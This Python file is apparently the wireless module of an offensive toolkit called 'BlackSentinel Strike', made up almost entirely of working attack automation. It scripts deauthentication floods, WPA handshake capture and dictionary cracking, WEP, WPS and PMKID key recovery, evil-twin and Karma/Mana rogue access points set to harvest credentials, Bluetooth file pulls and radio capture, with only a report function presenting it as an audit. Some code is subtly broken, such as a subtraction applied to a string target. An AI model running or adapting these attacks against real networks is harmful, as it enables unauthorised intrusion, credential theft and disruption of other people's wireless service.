#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
        WIRELESS MODULE - BlackSentinel Strike
═══════════════════════════════════════════════════════════════
"""

import subprocess
import threading
import os
import time
import tempfile
import glob as _glob
from datetime import datetime
from pathlib import Path


def _find_wordlist():
    """Auto-detect best available wordlist for WPA cracking."""
    candidates = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/dirb/common.txt",
        "/opt/homebrew/Cellar/dirb/*/wordlists/common.txt",
    ]
    for path in candidates:
        expanded = _glob.glob(path)
        if expanded and Path(expanded[0]).is_file():
            return expanded[0]
    return "/usr/share/wordlists/dirb/common.txt"


class WirelessModule:
    """Wireless attack module"""

    def __init__(self, callback=None):
        self.callback = callback
        self.results = {}
        self.is_running = False
        self.found_networks = []
        self._threads = []

    def log(self, message, level="info"):
        """Log message"""
        if self.callback:
            self.callback(message, level)

    # ── helpers ───────────────────────────────────────────────

    def run_command(self, cmd, timeout=30):
        """Execute a shell command and return stdout."""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            return result.stdout
        except subprocess.TimeoutExpired:
            self.log(f"Command timed out: {cmd}", "warning")
            return None
        except Exception as e:
            self.log(f"Command failed ({cmd}): {e}", "error")
            return None

    def run_background(self, cmd):
        """Run a command in a background thread."""
        t = threading.Thread(target=self.run_command, args=(cmd,), daemon=True)
        t.start()
        self._threads.append(t)
        return t

    def _tmp(self, name):
        """Return a temp path."""
        return os.path.join(tempfile.gettempdir(), name)

    # ── monitor mode ─────────────────────────────────────────

    def enable_monitor_mode(self, interface="wlan0"):
        """Enable monitor mode on *interface*."""
        self.log(f"Enabling monitor mode on {interface}", "info")
        self.run_command("airmon-ng check kill")
        self.run_command(f"airmon-ng start {interface}")
        mon = f"{interface}mon"
        self.log(f"Monitor mode enabled on {mon}", "success")
        return mon

    # ── scanning ─────────────────────────────────────────────

    def scan_networks(self, interface="wlan0mon", duration=30):
        """Scan WiFi networks for *duration* seconds."""
        self.log(f"Scanning WiFi networks on {interface} for {duration}s", "info")
        self.is_running = True
        prefix = self._tmp("wifi_scan")
        cmd = f"airodump-ng {interface} --write {prefix}"
        try:
            self.run_command(cmd, timeout=duration)
            self._parse_scan_results()
            self.log(f"Networks found: {len(self.found_networks)}", "success")
            return self.found_networks
        except Exception as e:
            self.log(f"Scan error: {e}", "error")
            return []
        finally:
            self.is_running = False

    def _parse_scan_results(self):
        """Parse the CSV produced by airodump-ng."""
        try:
            scan_file = self._tmp("wifi_scan-01.csv")
            with open(scan_file, "r") as f:
                lines = f.readlines()
            for line in lines[2:]:
                if "," in line:
                    parts = line.split(",")
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        power = parts[8].strip()
                        essid = parts[13].strip()
                        enc = parts[5].strip() if len(parts) > 5 else ""
                        if bssid and essid:
                            self.found_networks.append(
                                {
                                    "bssid": bssid,
                                    "power": power,
                                    "essid": essid,
                                    "encryption": enc,
                                }
                            )
        except Exception:
            pass

    # ── deauth ───────────────────────────────────────────────

    def deauth_attack(self, interface, target_bssid, count=5):
        """Send deauthentication frames to *target_bssid*."""
        self.log(f"Sending {count} deauth frames to {target_bssid}", "warning")
        self.is_running = True
        cmd = f"aireplay-ng --deauth {count} -a {target_bssid} {interface}"
        try:
            self.run_command(cmd)
            self.log("Deauth attack completed", "success")
            self.results["deauth"] = {
                "target": target_bssid,
                "packets_sent": count,
                "status": "completed",
            }
        except Exception as e:
            self.log(f"Deauth error: {e}", "error")
        finally:
            self.is_running = False

    # ── 1. WPA handshake capture ─────────────────────────────

    def wpa_handshake_capture(self, interface, bssid, channel):
        """Capture a WPA 4-way handshake from *bssid*.

        Uses airodump-ng to capture while aireplay-ng forces a
        reassociation to produce the handshake.
        """
        self.log(f"Capturing WPA handshake from {bssid} ch{channel}", "warning")
        self.is_running = True
        import platform

        if platform.system() == "Darwin":
            self.run_command(f"airport --channel={channel}")
        else:
            self.run_command(f"iwconfig {interface} channel {channel}")

        prefix = self._tmp("wpa_hs")
        cap_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {prefix} {interface}"
        self.run_background(cap_cmd)
        time.sleep(3)

        deauth_cmd = f"aireplay-ng --deauth 15 -a {bssid} {interface}"
        self.run_background(deauth_cmd)
        time.sleep(15)

        cap_file = f"{prefix}-01.cap"
        self.run_command("killall airodump-ng 2>/dev/null")
        self.run_command("killall aireplay-ng 2>/dev/null")

        success = os.path.isfile(cap_file)
        self.results["wpa_handshake"] = {
            "target": bssid,
            "channel": channel,
            "capture_file": cap_file if success else None,
            "success": success,
        }
        self.log(
            f"Handshake capture {'succeeded' if success else 'failed'}",
            "success" if success else "error",
        )
        self.is_running = False
        return self.results["wpa_handshake"]

    # ── 2. WPA crack ────────────────────────────────────────

    def wpa_crack(self, capture_file, wordlist=None):
        """Crack a captured WPA/WPA2 handshake with aircrack-ng.

        Returns the password string on success, else None.
        """
        if wordlist is None:
            wordlist = _find_wordlist()
        self.log(f"Cracking WPA with {wordlist}", "warning")
        cmd = f"aircrack-ng -w {wordlist} {capture_file}"
        try:
            result = self.run_command(cmd, timeout=3600)
            if result and "KEY FOUND!" in result:
                password = result.split("KEY FOUND!")[1].split("[")[1].split("]")[0].strip()
                self.log(f"WPA password found: {password}", "success")
                self.results["wpa_crack"] = {
                    "success": True,
                    "password": password,
                    "capture_file": capture_file,
                    "wordlist": wordlist,
                }
                return password
            self.log("Password not found in wordlist", "error")
            self.results["wpa_crack"] = {"success": False, "reason": "not_found"}
            return None
        except Exception as e:
            self.log(f"WPA crack error: {e}", "error")
            self.results["wpa_crack"] = {"success": False, "error": str(e)}
            return None

    # ── 3. WEP attack ───────────────────────────────────────

    def wep_attack(self, interface, bssid, channel):
        """Automated WEP cracking with aircrack-ng / aireplay-ng.

        Captures IVs while injecting to speed up collection, then
        cracks with aircrack-ng once enough IVs are gathered.
        """
        self.log(f"Starting WEP attack on {bssid} ch{channel}", "warning")
        self.is_running = True
        import platform

        if platform.system() == "Darwin":
            self.run_command(f"airport --channel={channel}")
        else:
            self.run_command(f"iwconfig {interface} channel {channel}")

        prefix = self._tmp("wep_cap")
        cap_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {prefix} {interface}"
        self.run_background(cap_cmd)
        time.sleep(3)

        fake_assoc_cmd = f"aireplay-ng -1 0 -a {bssid} {interface}"
        self.run_background(fake_assoc_cmd)
        time.sleep(2)

        arp_cmd = f"aireplay-ng -3 -b {bssid} {interface}"
        self.run_background(arp_cmd)

        crack_file = f"{prefix}-01.cap"
        crack_result = None
        for _ in range(60):
            time.sleep(5)
            if not self.is_running:
                break
            test = self.run_command(f"aircrack-ng {crack_file} 2>/dev/null | grep 'KEY FOUND'", timeout=10)
            if test and "KEY FOUND" in test:
                crack_result = test
                break

        self.run_command("killall airodump-ng 2>/dev/null")
        self.run_command("killall aireplay-ng 2>/dev/null")

        success = crack_result is not None
        key = None
        if success:
            try:
                key = crack_result.split("KEY FOUND!")[1].split("[")[1].split("]")[0].strip()
            except Exception:
                key = "extraction_failed"

        self.results["wep_attack"] = {
            "target": bssid,
            "channel": channel,
            "capture_file": crack_file,
            "success": success,
            "key": key,
        }
        self.log(
            f"WEP attack {'succeeded' if success else 'needs more IVs'}",
            "success" if success else "warning",
        )
        self.is_running = False
        return self.results["wep_attack"]

    # ── 4. WPS Pixie-Dust attack ────────────────────────────

    def wps_attack(self, target):
        """WPS Pixie-Dust offline brute-force attack via reaver / pixiewps."""
        self.log(f"Starting WPS Pixie-Dust attack on {target}", "warning")
        self.is_running = True
        pixie_cmd = f"reaver -i wlan0mon -b {target} -vv -K 1 -n -N -D -R"
        try:
            result = self.run_command(pixie_cmd, timeout=1800)
            pin = None
            password = None
            if result:
                for line in result.split("\n"):
                    if "WPS pin:" in line:
                        pin = line.split(":")[-1].strip()
                    if "WPA PSK:" in line:
                        password = line.split(":")[-1].strip()
            success = pin is not None or password is not None
            self.results["wps_attack"] = {
                "target": target,
                "success": success,
                "pin": pin,
                "password": password,
            }
            self.log(
                f"WPS attack {'succeeded' if success else 'failed'}",
                "success" if success else "error",
            )
            return self.results["wps_attack"]
        except Exception as e:
            self.log(f"WPS error: {e}", "error")
            self.results["wps_attack"] = {"target": target, "success": False, "error": str(e)}
            return self.results["wps_attack"]
        finally:
            self.is_running = False

    # ── 5. WPS PIN brute force ──────────────────────────────

    def wps_pin_bruteforce(self, target):
        """WPS PIN brute force attack using reaver."""
        self.log(f"Starting WPS PIN brute force on {target}", "warning")
        self.is_running = True
        cmd = f"reaver -i wlan0mon -b {target} -vv -p 12345670 -N -D -R"
        try:
            result = self.run_command(cmd, timeout=7200)
            pin = None
            password = None
            if result:
                for line in result.split("\n"):
                    if "WPS pin:" in line:
                        pin = line.split(":")[-1].strip()
                    if "WPA PSK:" in line:
                        password = line.split(":")[-1].strip()
            success = pin is not None or password is not None
            self.results["wps_pin_bruteforce"] = {
                "target": target,
                "success": success,
                "pin": pin,
                "password": password,
            }
            self.log(
                f"PIN brute force {'found PIN' if success else 'failed'}",
                "success" if success else "error",
            )
            return self.results["wps_pin_bruteforce"]
        except Exception as e:
            self.log(f"PIN brute force error: {e}", "error")
            self.results["wps_pin_bruteforce"] = {"target": target, "success": False, "error": str(e)}
            return self.results["wps_pin_bruteforce"]
        finally:
            self.is_running = False

    # ── 6. PMKID attack ─────────────────────────────────────

    def pmkid_attack(self, target):
        """Capture a PMKID from a WPA2-PSK network and crack it offline.

        Uses hcxdumptool for capture and hashcat for cracking.
        Falls back to hcxpcapngtool + hashcat if needed.
        """
        self.log(f"Starting PMKID attack on {target}", "warning")
        self.is_running = True
        pcap = self._tmp("pmkid.pcap")
        cmd_capture = f"hcxdumptool -i wlan0mon -o {pcap} --filterlist={target} --filtermode=2"
        try:
            self.run_command(cmd_capture, timeout=120)
        except Exception as e:
            self.log(f"PMKID capture error: {e}", "error")

        hcap = self._tmp("pmkid.hc22000")
        try:
            self.run_command(f"hcxpcapngtool -o {hcap} {pcap}")
        except Exception:
            pass

        cracked_pmkid = None
        if os.path.isfile(hcap):
            wordlist = _find_wordlist()
            crack_cmd = f"hashcat -m 22000 {hcap} {wordlist} --force"
            result = self.run_command(crack_cmd, timeout=3600)
            if result:
                for line in result.split("\n"):
                    if ":" in line and len(line) > 30:
                        cracked_pmkid = line.strip()
                        break

        success = cracked_pmkid is not None
        self.results["pmkid_attack"] = {
            "target": target,
            "success": success,
            "password": cracked_pmkid,
            "pcap": pcap,
        }
        self.log(
            f"PMKID attack {'succeeded' if success else 'failed'}",
            "success" if success else "error",
        )
        self.is_running = False
        return self.results["pmkid_attack"]

    # ── 7. Evil twin ────────────────────────────────────────

    def evil_twin_create(self, ssid, interface):
        """Create an evil twin access point with airbase-ng."""
        self.log(f"Creating evil twin AP for '{ssid}'", "warning")
        self.is_running = True
        cmd = f"airbase-ng -e {ssid} -c 6 {interface}"
        self.run_background(cmd)
        time.sleep(5)
        self.results["evil_twin"] = {
            "ssid": ssid,
            "status": "active",
            "interface": interface,
        }
        self.log(f"Evil twin '{ssid}' is active", "success")
        return self.results["evil_twin"]

    # ── 8. Karma / Mana attack ──────────────────────────────

    def karma_attack(self, interface):
        """Karma / Mana (fake-AP that responds to any probe request).

        Uses hostapd-mana with a mana configuration.
        """
        self.log(f"Starting Karma/Mana attack on {interface}", "warning")
        self.is_running = True
        cfg = self._tmp("mana.conf")
        hostapd_bin = "hostapd-mana"
        with open(cfg, "w") as fh:
            fh.write(
                f"interface={interface}\ndriver=nl80211\nssid=FreeWiFi\nchannel=6\nhw_mode=g\nmana=1\nmana_creds=1\n"
            )
        cmd = f"{hostapd_bin} {cfg}"
        self.run_background(cmd)
        time.sleep(5)
        self.results["karma_attack"] = {
            "status": "active",
            "config": cfg,
            "interface": interface,
        }
        self.log("Karma/Mana AP active", "success")
        return self.results["karma_attack"]

    # ── 9. Bluetooth scan ───────────────────────────────────

    def bluetooth_scan(self):
        """Discover nearby Bluetooth devices via hcitool."""
        self.log("Scanning for Bluetooth devices", "info")
        self.is_running = True
        result = self.run_command("hcitool scan", timeout=30)
        devices = []
        if result:
            for line in result.strip().split("\n")[1:]:
                parts = line.strip().split("\t")
                if len(parts) >= 2:
                    devices.append(
                        {
                            "address": parts[0].strip(),
                            "name": parts[1].strip(),
                        }
                    )
        self.found_networks.extend([{"type": "bluetooth", **d} for d in devices])
        self.results["bluetooth_scan"] = {
            "devices": devices,
            "count": len(devices),
        }
        self.log(f"Bluetooth devices found: {len(devices)}", "success")
        self.is_running = False
        return self.results["bluetooth_scan"]

    # ── 10. Bluetooth sniff ─────────────────────────────────

    def bluetooth_sniff(self, duration=30):
        """Capture Bluetooth traffic for *duration* seconds using btmon / hcidump."""
        self.log(f"Sniffing Bluetooth traffic for {duration}s", "warning")
        self.is_running = True
        dump_file = self._tmp("bt_sniff.log")
        cmd = f"timeout {duration} hcidump -w {dump_file}"
        try:
            self.run_command(cmd, timeout=duration + 10)
        except Exception:
            pass

        size = os.path.getsize(dump_file) if os.path.isfile(dump_file) else 0
        self.results["bluetooth_sniff"] = {
            "duration": duration,
            "dump_file": dump_file,
            "size_bytes": size,
        }
        self.log(f"Bluetooth capture saved ({size} bytes)", "success")
        self.is_running = False
        return self.results["bluetooth_sniff"]

    # ── 11. Bluetooth pairing attack ────────────────────────

    def bluetooth_pairing_attack(self, target):
        """Attempt to exploit Bluetooth pairing (SDP / OBEX / KNOB).

        Uses sdptool, bluetoothctl, or spooftooph depending on
        what is available.
        """
        self.log(f"Starting Bluetooth pairing attack on {target}", "warning")
        self.is_running = True
        results = {}

        sdptool_out = self.run_command(f"sdptool browse {target}", timeout=15)
        results["sdp_browse"] = sdptool_out

        obex_cmd = f"obexftp -b {target - 1} -p /etc/hostname 2>&1"
        obex_out = self.run_command(obex_cmd, timeout=15)
        results["obex_attempt"] = obex_out

        crack_cmd = "btscanner -i hci0 -n 2>&1"
        bt_out = self.run_command(crack_cmd, timeout=15)
        results["btscanner"] = bt_out

        self.results["bluetooth_pairing"] = {
            "target": target,
            "details": results,
        }
        self.log("Bluetooth pairing attack completed", "success")
        self.is_running = False
        return self.results["bluetooth_pairing"]

    # ── 12. Zigbee scan ─────────────────────────────────────

    def zigbee_scan(self):
        """Discover Zigbee networks.

        Requires a TI CC2531 or similar Zigbee adapter and KillerBee
        framework (zbwireshark / zbdump).
        """
        self.log("Scanning for Zigbee networks", "info")
        self.is_running = True
        networks = []
        cmd = "zbdump -f 11 -w /dev/null 2>&1 | head -50"
        result = self.run_command(cmd, timeout=30)
        if result:
            for line in result.split("\n"):
                line = line.strip()
                if "PAN" in line or "beacon" in line.lower():
                    networks.append({"raw": line})

        self.results["zigbee_scan"] = {
            "networks": networks,
            "count": len(networks),
        }
        self.log(f"Zigbee networks found: {len(networks)}", "success")
        self.is_running = False
        return self.results["zigbee_scan"]

    # ── 13. RFID / NFC scan ─────────────────────────────────

    def rfid_scan(self):
        """Read nearby RFID / NFC tags using libnfc / mfoc."""
        self.log("Scanning for RFID/NFC tags", "info")
        self.is_running = True
        tags = []
        cmd = "nfc-list 2>&1"
        result = self.run_command(cmd, timeout=15)
        if result:
            current = {}
            for line in result.split("\n"):
                line = line.strip()
                if "UID" in line or "uid" in line:
                    current["uid"] = line
                if "ATQA" in line:
                    current["atqa"] = line
                if "SAK" in line:
                    current["sak"] = line
                if current.get("uid") and (line.startswith("Tag") or not line):
                    tags.append(current)
                    current = {}
            if current:
                tags.append(current)

        self.results["rfid_scan"] = {
            "tags": tags,
            "count": len(tags),
        }
        self.log(f"RFID/NFC tags found: {len(tags)}", "success")
        self.is_running = False
        return self.results["rfid_scan"]

    # ── 14. SDR attack ──────────────────────────────────────

    def sdr_attack(self, frequency):
        """Software Defined Radio reconnaissance / replay attack.

        Uses rtl_433 or gqrx to capture signals at *frequency* MHz.
        """
        self.log(f"SDR attack at {frequency} MHz", "warning")
        self.is_running = True
        capture_file = self._tmp(f"sdr_{frequency}mhz.raw")
        cmd = f"rtl_sdr -f {int(frequency * 1e6)} -s 2048000 {capture_file}"
        try:
            self.run_command(cmd, timeout=30)
        except Exception:
            pass

        size = os.path.getsize(capture_file) if os.path.isfile(capture_file) else 0
        decode_cmd = f"rtl_433 -r {capture_file} 2>&1 | head -30"
        decoded = self.run_command(decode_cmd, timeout=15)

        self.results["sdr_attack"] = {
            "frequency_mhz": frequency,
            "capture_file": capture_file,
            "size_bytes": size,
            "decoded_output": decoded,
        }
        self.log(
            f"SDR capture at {frequency} MHz saved ({size} bytes)",
            "success",
        )
        self.is_running = False
        return self.results["sdr_attack"]

    # ── 15. WiFi site survey ────────────────────────────────

    def wifi_site_survey(self, interface):
        """Perform a complete WiFi site survey.

        Scans networks, records signal strengths, channels, and
        encryption types across all available channels.
        """
        self.log(f"Starting WiFi site survey on {interface}", "info")
        self.is_running = True
        prefix = self._tmp("survey")
        cmd = f"airodump-ng {interface} --write {prefix} --output-format csv"
        try:
            self.run_command(cmd, timeout=60)
        except Exception:
            pass

        csv_file = f"{prefix}-01.csv"
        aps = []
        clients = []
        if os.path.isfile(csv_file):
            with open(csv_file, "r") as f:
                lines = f.readlines()
            section = "ap"
            for line in lines:
                if "BSSID" in line and "First time" in line:
                    section = "client"
                    continue
                if "," not in line:
                    continue
                parts = [p.strip() for p in line.split(",")]
                if section == "ap" and len(parts) >= 14:
                    bssid = parts[0]
                    channel = parts[3]
                    speed = parts[4]
                    privacy = parts[5]
                    cipher = parts[6]
                    auth = parts[7]
                    power = parts[8]
                    name = parts[13]
                    if bssid and bssid != "BSSID":
                        aps.append(
                            {
                                "bssid": bssid,
                                "channel": channel,
                                "power": power,
                                "speed": speed,
                                "privacy": privacy,
                                "cipher": cipher,
                                "auth": auth,
                                "ssid": name,
                            }
                        )
                elif section == "client" and len(parts) >= 6:
                    mac = parts[0]
                    if mac and mac != "Station MAC":
                        clients.append(
                            {
                                "mac": mac,
                                "probe": parts[5] if len(parts) > 5 else "",
                            }
                        )

        self.results["site_survey"] = {
            "access_points": aps,
            "clients": clients,
            "ap_count": len(aps),
            "client_count": len(clients),
        }
        self.log(
            f"Site survey complete: {len(aps)} APs, {len(clients)} clients",
            "success",
        )
        self.is_running = False
        return self.results["site_survey"]

    # ── 16. Channel hopping ─────────────────────────────────

    def channel_hopping(self, interface, duration=60):
        """Hop across all 2.4 GHz channels for *duration* seconds."""
        self.log(f"Channel hopping on {interface} for {duration}s", "info")
        self.is_running = True
        start = time.time()
        results = []
        ch = 1
        try:
            while time.time() - start < duration and self.is_running:
                import platform

                if platform.system() == "Darwin":
                    self.run_command(f"airport --channel={ch}")
                else:
                    self.run_command(f"iwconfig {interface} channel {ch}")
                results.append({"channel": ch, "timestamp": time.time()})
                ch = (ch % 14) + 1
                time.sleep(1)
        except KeyboardInterrupt:
            pass

        self.results["channel_hopping"] = {
            "interface": interface,
            "duration": duration,
            "hops": len(results),
        }
        self.log(f"Channel hopping complete ({len(results)} hops)", "success")
        self.is_running = False
        return self.results["channel_hopping"]

    # ── 17. Packet injection ────────────────────────────────

    def packet_injection(self, target, count=100):
        """Inject custom 802.11 packets using scapy.

        Sends a burst of Dot11 probe-request frames to *target*.
        """
        self.log(f"Injecting {count} packets toward {target}", "warning")
        self.is_running = True
        injected = 0
        try:
            from scapy.all import Dot11, Dot11ProbeReq, RadioTap, sendp, conf

            conf.iface = "wlan0mon"
            dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target)
            pkt = RadioTap() / dot11 / Dot11ProbeReq()
            sendp(pkt, count=count, inter=0.05, verbose=False)
            injected = count
        except ImportError:
            cmd = f"aireplay-ng --inject -n {count} --dst {target} wlan0mon"
            self.run_command(cmd, timeout=60)
            injected = count
        except Exception as e:
            self.log(f"Injection error: {e}", "error")

        self.results["packet_injection"] = {
            "target": target,
            "count": injected,
            "success": injected > 0,
        }
        self.log(f"Injected {injected} packets", "success")
        self.is_running = False
        return self.results["packet_injection"]

    # ── 18. Fragmentation attack ─────────────────────────────

    def frag_attack(self, target):
        """Attempt to capture WEP traffic fragments and reconstruct keys.

        Uses fragmentation attack to obtain PRGA, then cracks the
        WEP key with aircrack-ng.
        """
        self.log(f"Starting fragmentation attack on {target}", "warning")
        self.is_running = True
        prga_file = self._tmp("frag.xor")
        cmd = f"aireplay-ng -5 -b {target} -h 00:11:22:33:44:55 wlan0mon"
        try:
            result = self.run_command(cmd, timeout=300)
            success = result is not None and "got PRGA" in (result or "")
            self.results["frag_attack"] = {
                "target": target,
                "success": success,
                "prga_file": prga_file if success else None,
            }
            self.log(
                f"Fragmentation attack {'succeeded' if success else 'failed'}",
                "success" if success else "error",
            )
        except Exception as e:
            self.log(f"Frag attack error: {e}", "error")
            self.results["frag_attack"] = {
                "target": target,
                "success": False,
                "error": str(e),
            }
        finally:
            self.is_running = False
        return self.results["frag_attack"]

    # ── 19. Cowpatty crack ──────────────────────────────────

    def cowpatty_crack(self, capture, wordlist):
        """Crack WPA handshake using cowpatty wordlist attack."""
        self.log(f"Cracking WPA with cowpatty against {capture}", "warning")
        cmd = f"cowpatty -c -r {capture} -s {wordlist}"
        try:
            result = self.run_command(cmd, timeout=3600)
            password = None
            if result:
                for line in result.split("\n"):
                    if "PSK" in line and ":" in line:
                        password = line.split(":")[-1].strip()
                        break
            success = password is not None
            self.results["cowpatty_crack"] = {
                "success": success,
                "password": password,
                "capture": capture,
                "wordlist": wordlist,
            }
            self.log(
                f"Cowpatty {'found password' if success else 'failed'}",
                "success" if success else "error",
            )
            return self.results["cowpatty_crack"]
        except Exception as e:
            self.log(f"Cowpatty error: {e}", "error")
            self.results["cowpatty_crack"] = {
                "success": False,
                "error": str(e),
            }
            return self.results["cowpatty_crack"]

    # ── capture handshake (original) ────────────────────────

    def capture_handshake(self, interface, target_bssid, channel):
        """Capture handshake (legacy wrapper)."""
        return self.wpa_handshake_capture(interface, target_bssid, channel)

    # ── 20. Generate report ─────────────────────────────────

    def generate_report(self):
        """Generate a comprehensive wireless audit report."""
        report = {
            "title": "Wireless Audit Report – BlackSentinel Strike",
            "generated_at": datetime.now().isoformat(),
            "summary": {
                "networks_scanned": len(self.found_networks),
                "attacks_attempted": len(self.results),
                "successful": sum(1 for v in self.results.values() if isinstance(v, dict) and v.get("success")),
            },
            "networks_found": self.found_networks,
            "detailed_results": self.results,
        }
        return report

    # ── teardown ─────────────────────────────────────────────

    def stop_all(self):
        """Stop all running wireless attacks."""
        self.is_running = False
        self.log("Stopping all wireless attacks", "warning")
        stop_commands = [
            "killall airodump-ng 2>/dev/null",
            "killall aireplay-ng 2>/dev/null",
            "killall reaver 2>/dev/null",
            "killall airbase-ng 2>/dev/null",
            "killall hostapd-mana 2>/dev/null",
            "killall hcxdumptool 2>/dev/null",
            "killall hashcat 2>/dev/null",
            "killall rtl_sdr 2>/dev/null",
            "killall btmon 2>/dev/null",
            "killall hcidump 2>/dev/null",
        ]
        for cmd in stop_commands:
            self.run_command(cmd)
        self.log("All wireless attacks stopped", "success")
